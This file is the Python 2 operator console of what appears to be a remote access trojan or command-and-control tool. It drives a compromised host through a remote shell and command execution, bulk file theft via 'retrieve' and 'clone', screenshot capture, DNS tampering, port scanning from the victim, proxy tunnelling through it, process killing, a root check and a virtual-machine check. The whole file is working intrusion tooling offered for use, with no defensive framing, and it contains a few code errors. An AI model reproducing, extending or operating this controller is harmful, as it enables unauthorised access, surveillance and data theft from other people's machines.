import socket, os, sys, subprocess as sp, base64

from basic_modules import *
from connection_modules import *

def console(connection, address, base_x, sysinfo):
	x_info = ''
	x_info += colors('g',' Operating System: ') + '%s\n' % (colors('b',sysinfo[0]))
	x_info += colors('g',' Computer Name: ') + '%s\n' % (colors('b',sysinfo[1]))
	x_info += colors('g',' CPU Information: ') + '%s\n' % (colors('b',str(sysinfo[11]).replace("<#>", ", ")))
 	x_info += colors('g',' Total Memory: ') + '%s\n' % (colors('b',sysinfo[12]))
 	x_info += colors('g',' Free Memory: ') + '%s\n' % (colors('b',sysinfo[13]))
 	x_info += colors('g',' Username: ') + '%s\n' % (colors('b',sysinfo[5]))
 	x_info += colors('g',' Release Version: ') + '%s\n' % (colors('b',sysinfo[2]))
 	x_info += colors('g',' System Version: ') + '%s\n' % (colors('b',sysinfo[3]))
 	x_info += colors('g',' Machine Architecture: ') + '%s\n' % (colors('b',sysinfo[4]))
 	x_info += colors('g',' User Comment: ') + '%s\n' % (colors('b',sysinfo[7]))
 	x_info += colors('g',' Uid Gid Pid: ') + '%s\n' % (colors('b',sysinfo[8]))
 	x_info += colors('g',' User Home Directory: ') + '%s\n' % (colors('b',sysinfo[9]))
 	x_info += colors('g',' User Shell: ') + '%s\n' % (colors('b',sysinfo[10]))
 	x_info += colors('g',' Session Signature: ') + '%s' % (colors('b',sysinfo[14]))

	user = sysinfo[5] + "@" + sysinfo[1]
	xdirectory = sysinfo[6]

	rshell = 1

	while 1:
		command = raw_input(" " + 
			colors("red", "%s" % (user)) + ":" + colors("b", xdirectory) + ">>" + " ").strip()

		if len(command) == 0:
			continue

		if rshell == 0:
			if command.split(" ")[0] == "cshell":
				rshell = 1
				print colors("g", "\n [+] ") + colors("b", "Free Command Shell Deactivated.\n")
				continue

			response = send_data(connection, "exec " + command)
			
			if response == "[XX]SESSION-END[XX]":
				continue

			if response.split("\n")[-1].strip() != "":
				response += "\n"

			if response.split("\n")[0].strip() != "":
				response = "\n" + response

			for x in response.split("\n"):
				print " " + colors("lgray", x)
			continue

		if command.split(" ")[0] == "rshell":
			if len(command.split(" ")) == 2 and command.split(" ")[1] == "-h":
				print colors("r","\n [!] ") + colors("b","Command: rshell [ -h ]")
				print colors("g", "\n Free Remote Command Shell Activated\n")
				continue

			rshell = 0
			print colors("g", "\n [+] ") + colors("b", "Free Remote Command Shell Activated.\n")
		elif command.strip() == "check_priv":
			response = send_data(connection, "check_priv")

			if response[:3] == "[+]":
				print colors("g", "\n [+] ") + colors("b", "Remote Script Has Root Priviledges. Proceed with Caution !\n")
			elif response[:3] == "[-]":
				print colors("r", "\n [-] ") + colors("b", "Remote Script Does Not Root Priviledges. Certain commands require root priviledges.\n")
		elif command.split(" ")[0] == "download":
			if len(command.split(" ")) < 2 or len(command.split(" ")) > 3:
				print colors("r","\n [!] ") + colors("b","Command: download <url> <full file path>")
				print colors("g", "\n Download files from the Web unto the Remote Machine.\n")
				continue

			url = ""
			f_name = ""

			url = command.split(" ")[1]

			if len(command.split(" ")) == 3:
				f_name = command.split(" ")[2]
			else:
				f_name = url.split("/")[-1]
			
			response = send_data(connection, "download %s %s" % (url,f_name))
			
			fs = 0

			if response == "[XX]SESSION-END[XX]":
				continue
			elif response[:4] == "[OK]":
				try:
					fs = int(response[4:].split(",")[0])
					f_name = response[4:].split(",")[1]
					#f_name = response[4:].split(",")[1].split("/")[-1]
					print colors("g", "\n [+] Remote Location: ") + colors("b", f_name)
					print colors("g", " [+] Filesize: ") + colors("b", human_readable(fs))

					while connection:
						d = send_data(connection)

						if len(d) > 0 and d != "[X][X]xDownload[X][X]":
							#" %s [ %3.2f% % ]" % (file_size_dl, file_size_dl * 100. / file_size)
							sys.stdout.write("\r" + colors("g", " [+] Downloaded: ") + colors("b", 
								str(human_readable(int(d.split("[")[0].strip()))) + " [ " + d.split("[")[1].strip().split("]")[0].strip() + " ]" ))
							sys.stdout.flush()
						else:
							break
					print colors("g", "\n [+] Download Complete.\n")
				except Exception as e:
					print colors("r", "\n [-] ") + colors("b", "An Error Occured.\n")
					print colors("b", "Error Details: %s\n" % (str(e)))
					continue
			else:
				print colors("r", "\n [-] ") + colors("b", "Unhandled Response: %s\n" % (response))
		elif command.split(" ")[0] == "exec":
			if len(command.split(" ")) == 1:
				print colors("r","\n [!] ") + colors("b","Command: exec <command>")
				print colors("g", "\n Execute Argument As Command On Remote Host\n")
				continue

			res = 1
			msg = ""

			while len(command.split(" ")) > res:
				msg += command.split(" ")[res] + " "
				res += 1

			response = send_data(connection, "exec " + msg)
			
			if response == "[XX]SESSION-END[XX]":
				continue

			if response.split("\n")[-1].strip() != "":
				response += "\n"

			if response.split("\n")[0].strip() != "":
				response = "\n" + response

			for x in response.split("\n"):
				if x == "[-] Unknown Command":
					print colors("r", " [-] ") + colors("b", "Unknown Command")
				else:
					print " " + colors("lgray", x)
		elif command.split(" ")[0] == "terminate":
			if len(command.split(" ")) != 2:
				print colors("r","\n [!] ") + colors("b","Command: terminate <PID>")
				print colors("g", "\n Terminate A Process On The Remote Host Using Signals\n")
				continue
			pid = str(command.split(" ")[1])

			response = send_data(connection, "terminate %s" % (pid))

			if response == "[XX]SESSION-END[XX]":
				continue

			if response == "OK":
				print "\n" + colors("g", " [+] ") + colors("b", "Process %s Terminated\n" % (pid))
			elif response == "FAIL":
				print "\n" + colors("r", " [-] ") + colors("b", "Process %s Failed To Be Terminated\n" % (pid))
			else:
				print "\n" + colors("r", " [-] ") + colors("b", "Unhandled Response: %s\n" % (response))
		elif command.split(" ")[0] == "dnsch":
			if len(command.split(" ")) < 2:
				print colors("r","\n [!] ") + colors("b","Command: dnsch address1 address2 address3 ... --conf={/etc/resolv.conf}")
				print colors("g", "\n Changes DNS addresses with specified ones. \n Change the default resolv.conf path ( /etc/resolv.conf ) by adding --conf={<dns resolv conf path>} as an argument\n")
				continue

			dns = ""
			path = "/etc/resolv.conf"

			for x in command.strip().split(" ")[1:]:
				if x[:8] == "--conf={" and x[-1] == "}":
					d = x[8:]
					d = d[:-1]
					path = d
				elif x.count(".") == 3:
					dns += "%s " % (x.strip())

			response = send_data(connection, "dnsch --conf={%s} %s" % (path, dns))

			if response == "[XX]SESSION-END[XX]":
				continue
			elif response[:3] == "[+]":
				print colors("g", "\n [+] ") + colors("b", response[4:]) + "\n"
			elif response[:3] == "[-]":
				print colors("g", "\n [-] ") + colors("b", response[4:]) + "\n"
		elif command.split(" ")[0] == "clone":
			directory = ''

			if len(command.split(" ")) == 1:
				directory = xdirectory
			else:
				directory = ' '.join(command.split(' ')[1:])

			response = send_data(connection, "clone %s" % ( directory))

			if response == "[XX]SESSION-END[XX]":
				continue

			directory_list = response.split("#")[0]
			directory_list = directory_list.split(",")

			files_found = response.split("#")[1]
			files_size = human_readable(int(files_found.split(",")[1]))
			files_found = int(files_found.split(",")[0])

			dir_count = 0

			for x in sorted(directory_list):
				x = str(base_x + x).replace("//","/")
				if os.path.exists(x) == False:
					os.makedirs(x)
				dir_count += 1

			print colors("g", "\n [+] ") + colors("b", "Total Directories Created: %d" % (dir_count))
			print colors("g", " [+] ") + colors("b", "Initiating File Transfer of %s files: %s" % (str(files_found), files_size))
			
			k = raw_send_data(connection, "ACKNOWLEDGED")

			if k == "[XX]SESSION-END[XX]":
				continue

			initiate_individual_file_transfer(connection, str(files_found), base_x)
		elif command.split(" ")[0] == "surf_proxy":
			local_port = 0
			buffer_size = 65535
			max_conn = 10
			int_addr = '0'

			if len(command.split(" ")) < 2:
				print colors("r","\n [!] ") + colors("b","Command: surf_proxy lport=<port number> [ Optional: bs=%d mc=%d int_addr=%s]" % (buffer_size, max_conn, int_addr))
				print colors("g", "\n Setup a proxy on the remote host and tunnel through it.\n Arguments: lport - Local Port, bs - Buffer Size ( Default: %d ), mc - Max Connections ( Default: %d ), int_addr - Interface Address ( Enter 0 for '' )\n" % (buffer_size, max_conn))
				continue

			for x in command.split(" ")[1:]:
				d = x.strip()
				if d[:6] == "lport=" and d[6:].isdigit() == True:
					local_port = int(d[6:])
				elif d[:3] == "bs=" and d[3:].isdigit() == True and d[3:] <= 65535:
					buffer_size = int(d[3:])
				elif d[:3] == "mc=" and d[3:].isdigit() == True and d[3:] <= 65535:
					max_conn = int(d[3:])
				elif d[:9] == "int_addr=":
					int_addr = d[9:]

			if local_port == 0:
				local_port = random.randint(2048, 65535)

			print colors("g", "\n [ Info ] ") + colors("b", "Setting local listening port to %d" % (local_port))
			print colors("g", " [ Info ] ") + colors("b", "Setting connection limit to %d" % (max_conn))
			print colors("g", " [ Info ] ") + colors("b", "Setting buffer size to %s" % (human_readable(buffer_size)))

			if int_addr != '0':
				print colors("g", " [ Info ] ") + colors("b", "Binding proxy address to %s\n" % (int_addr))
			else:
				int_addr = ''
				print ''

			sup = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
			try:
				sup.bind((int_addr, local_port))
				sup.listen(max_conn)
				print "[+] Server Started Successfully [ %d ]\n" % (local_port)
			except Exception as e:
				print "\n[-] Unable to Setup Socket"
				print "[-] Error Value: " + str(e)
				continue

			response = send_data(connection, "surf_proxy bs=%d" % (buffer_size))

			if response == "[XX]SESSION-END[XX]":
				continue
			elif response == "OK":
				print colors("g", " [+] ") + colors("b", " Remote Server Ready")
	
			while 1:
				try:
					conn, addr = sup.accept()
					data = conn.recv(buffer_size)
					start_new_thread(suproxy, (connection, data, conn, buffer_size,))
				except Exception as e:
					conn.close()
					print colors("r", " [-] ") + colors("g", "Unable to process request : " + str(e)) 
			sup.close()
		elif command.split(" ")[0] == "host-scanner":
			if len(command.split(" ")) < 2:
				print colors("r","\n [!] ") + colors("b","Command: host-scanner t=target p={min_port,max_port}")
				print colors("g", "\n Scan a Target Host from the Remote Host\n The function follows a format: t=target, p={min_port,max_port}. No Spaces between port range.\n")
				continue

			arguments = command.split(" ")[1:]
			ip = ""
			mini_port = 0
			max_port = 0

			for x in arguments:
				if x[:2] == "t=" and x.count(".") == 3:
					d = x
					d = d[2:]
					ip = d
				elif x[:3] == "p={" and x[-1] == "}" and x.count(",") == 1:
					d = x
					d = d[3:]
					d = d[:-1].split(",")
					try:
						mini_port = int(d[0].strip())
						max_port = int(d[1].strip())
					except Exception as e:
						mini_port = 0
						max_port = 0

			if mini_port == 0 or max_port == 0:
				mini_port = 1
				max_port = 1024
				print colors("g", "\n [ Info ] ") + colors("b", " Using default port range ( %d - %d )" % (mini_port, max_port))

			if ip == "":
				print colors("r", "\n [ Info ] ") + colors("b", "Specify a host to scan.\n")
				continue
			
			response = send_data(connection, "portscan t=%s p={%d,%d}" % (ip.strip(), mini_port,max_port))

			if response == "[XX]SESSION-END[XX]":
				continue
			elif response[:13] == "[-] Hosterror":
				print colors("r", "\n [-] ") + colors("b", "Unable to resolve host: " + response[14:] + "\n")
				continue

			nk = os.getcwd() + "/ports.txt"
			p_list = []

			for x in response.split("\n"):
				if x[:3] == "[+]":
					x = x[3:].strip()
					p_list.append(x)

			p = {}
			lo = 0

			if os.path.exists(nk):
				f = open(nk)
				p = f.readlines()
				f.close()
				lo = 1
			print colors("g","\n [+] Host: ") + colors("b", ip) + colors("g"," [+] Ports Found: ") + colors("b", str(len(p_list))) + "\n"
			if lo == 1:
				for x in sorted(p):
					x = x.strip("\n")
					for y in sorted(p_list):
						if str(y.strip()) == str(x.split("#")[1].replace("/tcp", "").strip()):
							print colors("g"," [+] Service Name: ") + colors("b",x.split("#")[0]) + " " + colors("g", "[+] Port Number: ") + colors("b", x.split("#")[1])
							p_list.remove(str(y.strip()))
							break
				
				if len(p_list) > 0:
					for y in sorted(p_list):
						print colors("g"," [+] Service Name: ") + colors("b", "Unknown ") + colors("g", "[+] Port Number: ") + colors("b",y + "/tcp")
			else:
				for x in p_list:
					print colors("g"," [+] Service Name: ") + colors("b", "Unknown ") + colors("g", "[+] Port Number: ") + colors("b",x)
			print colors("g","\n [+] ") + colors("b", "Scanning Complete\n")
		elif command.split(" ")[0] == "rm":
			if len(command.split(" ")) == 1: 
				print colors("r","\n [!] ") + colors("b","Command: rm <filename>") 
				print colors("g", "\n Delete File from Remote Disk\n") 
				print colors("g", " NOTE: Use comma (,) as a seperator in situations of reading more than a single file\n") 
				continue

			filepath = ' '.join(command.split(" ")[1:])

			response = send_data(connection, "remove %s" % (str(filepath)))

			if response == "[XX]SESSION-END[XX]":
				continue

			print ""

			for x in response.split("\n"):
				if x[:3] == "[+]":
					print colors("g", " [+]") + colors("b", str(x[3:]))
				elif x[:3] == "[-]":
					print colors("g", " [-]") + colors("b", str(x[3:]))
				else:
					print colors("g", " [-]") + colors("b", "Unhandled error: " + str(x))
			print ""
		elif command.split(" ")[0] == "devices":
			if len(command.split(" ")) != 1: 
				print colors("r","\n [!] ") + colors("b","Command: devices") 
				print colors("g", "\n Get Mounted Devices On Remote Machine\n")
				continue

			response = send_data(connection, "devices")

			if response == "[XX]SESSION-END[XX]":
				continue

			print ""
			for y in response.split("<#>")[:-1]:
				for x in y.split(","):
					if "device capacity" in x.lower():
						print colors("g", " " + str(x.split(":")[0])) + colors("b", ": " + str(human_readable(int(x.split(":")[1].strip()))))
					else:
						print colors("g", " " + str(x.split(":")[0])) + colors("b", ":" + str(x.split(":")[1]))
				print ""

		elif command.split(" ")[0] == "interfaces":
			if len(command.split(" ")) != 1: 
				print colors("r","\n [!] ") + colors("b","Command: interfaces") 
				print colors("g", "\n Get Remote Network Interface. Accepts no argument\n")
				continue

			response = send_data(connection, "interfaces")

			if response == "[XX]SESSION-END[XX]":
				continue

			dp = response

			print ""

			for x in dp.split("#"):
				print colors("g", " [+] Interface: ") + colors("b", "%s" % (str(x.split(",")[0])))
				print colors("g", "        [+] IP Address: ") + colors("b", "%s" % (str(x.split(",")[1])))
				print colors("g", "        [+] MAC Address: ") + colors("b", "%s" % (str(x.split(",")[2])))
				print colors("g", "        [+] Received Bytes: ") + colors("b", "%s" % (human_readable(long(x.split(",")[3]))))
				print colors("g", "        [+] Transmitted Bytes: ") + colors("b", "%s\n" % (human_readable(long(x.split(",")[4]))))
		elif command.split(" ")[0] == "pwd":
			if len(command.split(" ")) != 1: 
				print colors("r","\n [!] ") + colors("b","Command: pwd") 
				print colors("g", "\n Print working directory\n")
				continue

			response = send_data(connection, "pwd")

			if response[:4] == "[OK]":
				print colors("g", "\n [+] Current Working Directory: ") + colors("b", response[4:] + "\n")
				xdirectory = response[4:]
			else:
				print colors("r", " [-] ") + colors("g", "An error occurred\n")
		elif command.split(" ")[0] == "screenshot":
			if len(command.split(" ")) != 1:
				print colors("r","\n [!] ") + colors("b","Command: screenshot") 
				print colors("g", "\n Capture Remote Host Desktop. Accepts no argument\n")
				continue
			
			response = send_data(connection, "screenshot")

			if response == "[XX]SESSION-END[XX]":
				continue

			if response.split("<3>")[0] == "0":
				local_filepath = os.pah.join(base_x, response.split("<3>")[1])
				data = response.split("<3>")[2]

				k = open(local_filepath, 'wb')
				k.write(data)
				k.close()

				print colors("g", "\n [+] ") + colors("b", "Screenshot successfully taken")
				print colors("g", " [+] ") + colors("b", "Local Storage Path: %s\n" % (local_filepath))
			elif response.split("<3>")[0] == "1":
				print colors("r", "\n [-] ") + colors("b", "Screenshot failed")
				print colors("r", " [-] ") + colors("b", "Error Message: %s\n" % (response.split("<3>")[1]))
		elif command.split(" ")[0] == "cat":
			if len(command.split(" ")) == 1: 
				print colors("r","\n [!] ") + colors("b","Command: cat <filename>") 
				print colors("g", "\n Read File Content\n") 
				print colors("g", " NOTE: Use comma (,) as a seperator in situations of reading more than a single file\n") 
				continue

			file_path = ' '.join(command.split(' ')[1:])
			
			if file_path[0] != "/":
				file_path = xdirectory + "/" + file_path

			response = send_data(connection, "cat %s" % (file_path.strip()))

			if response == "[XX]SESSION-END[XX]":
				continue

			if response.split("\n")[-1].strip() != "":
				response += "\n"

			if response.split("\n")[0].strip() != "":
				response = "\n" + response

			for x in response.split("\n"):
				if len(x) > 8 and x[:8] == "[+] File":
					print " " + colors("g", x)
				elif len(x) > 8 and x[:8] == "[-] File":
					print " " + colors("r", x)
				else:
					print " " + colors("lgray", x)
		elif command.split(" ")[0] == "sys_users":
			if len(command.split(" ")) != 1:
				print colors("r","\n [!] ") + colors("b","Command: sys_users")
				print colors("g", "\n Get Information About System Users\n")
				continue

			response = send_data(connection, "sys_users")

			if response == "[XX]SESSION-END[XX]":
				continue

			if response.split("\n")[-1].strip() != "":
				response += "\n"

			if response.split("\n")[0].strip() != "":
				response = "\n" + response
			
			print colors("lgray",response)
		elif command.split(" ")[0] == "cd":
			if len(command.split(" ")) == 1:
				print colors("r","\n [!] ") + colors("b","Command: cd <directory>")
				print colors("g", "\n Change the Shell Directory\n")
				continue

			res = 1
			args = ""

			while len(command.split(" ")) > res:
				args += command.split(" ")[res] + " "
				res += 1

			args = args.strip()

			response = send_data(connection, "cd " + args)

			if response == "[XX]SESSION-END[XX]":
				continue

			if response == "1":
				print "\n " + colors("red", "[-] ") + colors("b", "Directory Does Not Exist\n")
			elif response[0] == "/":
				xdirectory = response
		elif command.split(" ")[0] == "kill":
			response = send_data(connection, "kill")

			if response == "[XX]SESSION-END[XX]":
				continue

			print "\n" + colors("g", " " + response[:3]) + colors("b", response[3:])
			
			print colors("g"," [+] ") + colors("b", "Remote Shell Terminated\n")
			return 0
		elif command.split(" ")[0] == "lookup":
			if len(command.split(" ")) == 1 or len(command.split(" ")) > 3: 
				print colors("r","\n [!] ") + colors("b","Command: lookup <directory> <filename>") 
				print colors("g", "\n Search files On Remote Host\n") 
				print colors("g", " NOTE: The Current Directory Is Used If Not Specified\n") 
				continue

			directory = '' 
			filename = '' 

			if len(command.split(" ")) == 2: 
				directory = xdirectory 
				filename = command.split(" ")[1] 
			else: 
				directory = command.split(" ")[2] 
				filename = command.split(" ")[1]

			data = "lookup %s %s" % (filename, directory)
			
			response = send_data(connection, data)

			if response == "[XX]SESSION-END[XX]":
				continue

			if response == "D-error":
				print colors("r", "\n [!]") + colors("b", " Directory Does Not Exist On The Remote System\n")
			elif response == "D-ok":
				print colors("g", "\n [+]") + colors("b", " Search started in %s\n" % (directory))
				structure = send_data(connection).split("\n")

				if response == "[XX]SESSION-END[XX]":
					continue

				for x_file in structure:
					print " " + colors("gray", x_file)
				print colors("g", "\n [+]") + colors("b", " Search Complete. %d file(s) found\n" % (len(structure)))
			else:
				print response

		elif command.split(" ")[0] == "retrieve":
			if len(command.split(" ")) != 2:
				print colors("r","\n [!] ") + colors("b","Command: retrieve <filename>")
				print colors("g", "\n Download files from Remote Host ( Unencrypted Channel )\n")
				continue

			filename = ' '.join(command.split(" ")[1:])

			if filename[0] != "/":
				filename = xdirectory + "/" + filename

			k = raw_send_data(connection, "retrieve %s" % (filename))

			if k == "[XX]SESSION-END[XX]":
				continue

			response = connection.recv(retrieve_encryption_buffer_size(0))

			if response[:8] == "IO-error":
				print colors("r", "\n [!]") + colors("b", " File Does Not Exist On The Remote System\n")
			elif response[:8] == "OK-SIZE:":
				bytes_to_recv = response[8:24]
				initiate_file_transfer(connection,bytes_to_recv, filename, base_x)
			elif response[:8] == "Direrror":
				print colors("r", "\n [!]") + colors("b", " The Path Specified Is A Directory\n")
			else:
				print response
		elif command.split(" ")[0] == "ps":
			argum = ""

			if len(command.split(" ")) > 1:
				argum = ' '.join(command.split(" ")[1:])
			else:
				argum = "aux"
			
			response = send_data(connection, 'ps %s' % (argum))

			if response == "[XX]SESSION-END[XX]":
				continue

			print ""
			for x in response.split("\n"):
				print " " + colors("lgray", x)
			print ""

		elif command.split(" ")[0] == "ls":
			directory = ""

			if len(command.split(" ")) > 1:
				directory = ' '.join(command.split(" ")[1:])
			else:
				directory = xdirectory

			response = send_data(connection, 'ls %s' % (directory))

			if response == "[XX]SESSION-END[XX]":
				continue

			if response == "[-] Directory Does Not Exist!":
				print "\n " + colors("r", "[-] ") + colors("b", "Directory Does Not Exist!\n")
			else:
				print colors("g", "\n Directory Listing for: ") + colors("b", xdirectory + "\n")
				for x in response.split("\n"):
					if x[:5] != "total":
						if x[0] == "-":
							perm = x[1:4].replace("-", "")
							perm += ' ' * (4 - (len(perm) % 4))
							d = x.split()
							owner = d[2]
							fsize = human_readable(int(d[4]))
							fname = ' '.join(d[8:]).strip()
							if(fname[0] == "."):
								fname += " [ Hidden ]"
							fdate = d[5] + " " + d[6] + " " + d[7]
							print colors('g'," [ " + perm + " ] ") + colors("y","Owner: ") + colors("b", owner) + colors("y"," Access Date: ") + colors("b", fdate) + colors("y"," Filesize: ") + colors("b", fsize) + colors("y"," Filename: ") + colors("b", fname)
						elif x[0] == "d":
							perm = x[1:4].replace("-", "")
							perm += ' ' * (4 - (len(perm) % 4))
							d = x.split()
							owner = d[2]
							fsize = human_readable(int(d[4]))
							fname = ' '.join(d[8:]).strip()
							if(fname == "."):
								fname += " [ Current Directory ]"
							elif(fname == ".."):
								fname += " [ Previous Directory ]"
							elif(fname[0] == "."):
								fname += " [ Hidden ]"
							fdate = d[5] + " " + d[6] + " " + d[7]
							print colors('g'," [ " + perm + " ] ") + colors("y","Owner: ") + colors("b", owner) + colors("y"," Access Date: ") + colors("b", fdate) + colors("y"," Size: ") + colors("b", fsize) + colors("y"," Directory: ") + colors("b", fname)
						elif x[0] == "l":
							perm = x[1:4].replace("-", "")
							perm += ' ' * (4 - (len(perm) % 4))
							d = x.split()
							owner = d[2]
							fsize = human_readable(int(d[4]))
							fname = ' '.join(d[8:]).strip()
							if(fname[0] == "."):
								fname += " [ Hidden ]"
							fdate = d[5] + " " + d[6] + " " + d[7]
							print colors('g'," [ " + perm + " ] ") + colors("y","Owner: ") + colors("b", owner) + colors("y"," Access Date: ") + colors("b", fdate) + colors("y"," Size: ") + colors("b", fsize) + colors("y"," Link: ") + colors("b", fname)
						else:
							print x
				print ""
		elif command.split(" ")[0] == "send":
			if len(command.split(" ")) == 1:
				print colors("r","\n [!] ") + colors("b","Command: send <directory> <filename>\n")
				print colors("g", " Send files To Remote Host\n")
				print colors("g", " NOTE: The Current Directory will Be Used As The Upload Directory If Omitted\n")
				continue
			
			directory = ""
			filename = ""

			if len(command.split(" ")) == 2:
				directory = xdirectory
				filename = command.split(" ")[1]
				if filename[0] != "/":
					filename = xdirectory + "/" + filename
			else:
				directory = command.split(" ")[1]
				filename = ' '.join(command.split(" ")[2:])
				if filename[0] != "/":
					filename = xdirectory + "/" + filename

			if os.path.exists(filename) == False:
				print colors("r", "\n [-] ") + colors("b", "The Local File To Be Uploaded Cannot Be Found\n")
				continue

			connection.send('send %s %s' % (directory, filename))
			response = connection.recv(10)

			if response == "DirerrorOK":
				print colors("r","\n [-] ") + colors("b", "Directory Does Not Exist On Remote System\n")
			elif response == "ALLSYSISGO":
				print colors("g","\n [+] ") + colors("b", "File Transfer Initiated ...")
				top = str(os.path.getsize(filename)).zfill(19)
				connection.send("SIZE:" + top)

				response = connection.recv(3)

				if response == "ACK":
					send_file_over(connection, filename, top)
				else:
					print colors("r", "\n [-] ") + colors("b", " An Unknown Response Was Received. Script Modified or Hack Back.")
			elif response == "[XX]SESSION-END[XX]":
				continue
		elif command.split(" ")[0] == "check_vm":
			if len(command.split(" ")) != 1:
				print colors("r","\n [!] ") + colors("b","Command: check_vm")
				print colors("g", "\n Checks if The Remote System Is A Virtual Machine\n")
				continue

			response = send_data(connection, 'check_vm')

			if response == "[XX]SESSION-END[XX]":
				continue

			if response.split("\n")[0] != "":
				response = "\n" + response
			if response.split("\n")[-1] != "":
				response += "\n"

			for x in response.split("\n"):
				if x[:3] == "[+]":
					print " " + colors("g", "[+]") + colors("b", x[3:])
				elif x[:3] == "[-]":
					print " " + colors("r", "[-]") + colors("b", x[3:])
				else:
					print " " + x
			
		elif command == "":
			continue
		elif command == "cls" or command == "clear":
			dp = os.system("clear")
		elif command.split(" ")[0] == "help":
			if len(command.split(" ")) > 1:	
				print help(' '.join(command.split(" ")[1:]))
			else:
				print help("")
		elif command == "sysinfo":
			print "\n" + colors("gray",x_info) + "\n"
		elif command == "background":
			print colors("g","\n [+] ") + colors("b", "Backgrounding client %s" % (address))
			print colors("g"," [+] ") + colors("b", "Returning to framework ... done\n")
			return
		else:
			out, err, returncode = execute_command(command)

			result = str(out) + str(err)

			if result == "" and returncode == 0:
				result = "Successful Execution"

			if len(err) != 0 and returncode != 0:
				return

			print colors("success", "Execute command: %s " % (command), 1)

			if result.split("\n")[-1].strip() != "":
				result += "\n"

			if result.split("\n")[0].strip() != "":
				result = "\n" + result

			for x in result.split("\n"):
				print colors("lg", " " + x)